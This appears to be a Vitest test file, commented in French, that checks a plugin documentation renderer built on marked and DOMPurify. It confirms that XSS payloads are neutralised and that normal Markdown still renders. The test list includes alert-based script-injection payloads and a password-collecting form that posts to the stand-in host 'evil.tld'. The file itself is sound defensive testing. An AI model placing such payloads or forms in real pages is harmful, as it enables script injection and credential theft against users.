import { describe, it, expect } from 'vitest';
import { marked } from 'marked';
import DOMPurify from 'dompurify';

/**
 * Rendu de la documentation d'un plugin.
 *
 * Le champ `docs` vient d'un bundle déposé par un administrateur : c'est de la
 * donnée d'origine externe, injectée en `dangerouslySetInnerHTML`. La version
 * d'origine construisait le HTML par une chaîne de `replace()` et n'échappait
 * rien hors des blocs de code - un `<img src=x onerror=…>` dans une doc
 * s'exécutait chez tout utilisateur consultant la fiche.
 *
 * Ces tests reproduisent le pipeline de DocViewer.jsx.
 */
marked.setOptions({ gfm: true, breaks: true });
// Même configuration que DocViewer.jsx : DOMPurify autorise <form> par défaut,
// ce qui permettrait d'afficher un formulaire de collecte dans une doc.
const PURIFY_OPTS = {
  FORBID_TAGS: ['form', 'input', 'button', 'textarea', 'select', 'option', 'label'],
  FORBID_ATTR: ['formaction', 'action'],
};
const rendre = md => DOMPurify.sanitize(marked.parse(md), PURIFY_OPTS);

const dansLeDom = html => {
  const d = document.createElement('div');
  d.innerHTML = html;
  return d;
};

describe('assainissement de la documentation', () => {
  const charges = [
    ['image avec onerror', '<img src=x onerror="alert(1)">'],
    ['script inline', '<script>alert(1)<\/script>'],
    ['svg avec onload', '<svg onload=alert(1)>'],
    ['iframe javascript:', '<iframe src="javascript:alert(1)"></iframe>'],
    ['lien javascript:', '[clic](javascript:alert(1))'],
    ['body avec onpageshow', '<body onpageshow=alert(1)>'],
    ['details avec ontoggle', '<details open ontoggle=alert(1)>'],
    ['formulaire de collecte', '<form action="//evil.tld"><input name=pw></form>'],
  ];

  for (const [nom, charge] of charges) {
    it(`neutralise : ${nom}`, () => {
      const dom = dansLeDom(rendre(charge));
      expect(dom.querySelectorAll('script, iframe, form, object, embed')).toHaveLength(0);
      // Aucun gestionnaire d'événement ne subsiste sur aucun élément
      for (const el of dom.querySelectorAll('*')) {
        for (const attr of el.attributes) expect(attr.name.startsWith('on')).toBe(false);
      }
      expect(dom.innerHTML).not.toMatch(/javascript:/i);
    });
  }
});

describe('rendu du Markdown légitime', () => {
  const doc = `# Titre
## Sous-titre

Du **gras**, de l'*italique* et du \`code\`.

- item
  - imbriqué

| Champ | Type |
|-------|------|
| id    | str  |

> citation

\`\`\`js
const x = a < b && c > d;
\`\`\`

[lien](https://example.com)
`;

  it('rend les titres, le gras et l’italique', () => {
    const h = rendre(doc);
    expect(h).toMatch(/<h1>Titre<\/h1>/);
    expect(h).toMatch(/<strong>gras<\/strong>/);
    expect(h).toMatch(/<em>italique<\/em>/);
  });

  it('rend les listes imbriquées et les tableaux', () => {
    // La version regex ne savait faire ni l'un ni l'autre.
    const h = rendre(doc);
    expect(h).toMatch(/<ul>[\s\S]*<ul>/);
    expect(h).toMatch(/<table>[\s\S]*<th>Champ<\/th>/);
  });

  it('échappe le contenu des blocs de code', () => {
    expect(rendre(doc)).toMatch(/a &lt; b &amp;&amp; c &gt; d/);
  });

  it('conserve les liens externes', () => {
    expect(dansLeDom(rendre(doc)).querySelector('a')?.getAttribute('href'))
      .toBe('https://example.com');
  });
});
